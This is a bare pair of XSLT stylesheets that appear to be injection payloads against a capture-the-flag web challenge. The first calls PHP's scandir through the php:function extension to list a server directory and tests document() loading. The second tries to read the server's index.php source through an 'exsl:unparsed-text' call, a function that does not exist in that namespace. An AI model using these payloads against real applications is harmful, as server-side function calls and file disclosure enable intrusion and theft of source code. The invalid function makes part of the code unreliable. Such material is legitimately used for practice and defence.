<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl" version="1.0">
    <xsl:template match="/">
        <xsl:text>=== Listing local files in allowed directory ===&#10;</xsl:text>
        <xsl:for-each select="php:function('scandir', '/challenge/web-serveur/ch50')">
            <xsl:value-of select="." />
            <xsl:text>&#10;</xsl:text>
        </xsl:for-each>
        <xsl:text>=== Test document() ===&#10;</xsl:text>
        <xsl:variable name="test" select="document('example.xml')" />
        <xsl:value-of select="$test" />
    </xsl:template>
</xsl:stylesheet>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:exsl="http://exslt.org/common" version="1.0">
    <xsl:template match="/">
        <xsl:text>=== Test unparsed-text ===&#10;</xsl:text>
        <xsl:value-of select="exsl:unparsed-text('/challenge/web-serveur/ch50/index.php')" />
    </xsl:template>
</xsl:stylesheet>
